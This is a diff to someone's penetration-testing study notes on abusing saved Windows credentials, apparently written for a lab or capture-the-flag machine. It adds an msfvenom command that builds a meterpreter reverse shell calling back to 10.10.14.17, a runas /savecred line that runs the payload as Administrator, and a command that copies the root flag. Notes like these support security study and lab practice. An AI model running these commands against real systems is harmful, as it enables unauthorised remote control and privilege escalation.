@@ -20,15 +20,15 @@ Windows stores saved usernames and passwords for things like Remote Desktop conn
 # List saved credentials:
 cmdkey /list
 
-# If found any cres then:
-# Run a shell here
-runas /savecred /user:admin C:\PrivEsc\reverse.exe
-# Run a command as a saved user:
-runas /savecred /user:inlanefreight\bob "COMMAND HERE"
-# Example: Run PowerShell as that user:
-runas /savecred /user:inlanefreight\bob "powershell.exe"
-```
+# create a reverse shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=4747 -f exe -o oscpp.exe
 
+# run the reverse
+runas /savecred /user:Access\\Administrator C:\\PrivEsc\\oscpp.exe
+
+# copy flag as logged in user
+runas /user:Access\\Administrator /savecred "cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Users\\security\\Desktop\\flag.txt"
+```
 ![[Pasted image 20250828064001.png]]
 
 # Browser Credentials (Chrome)
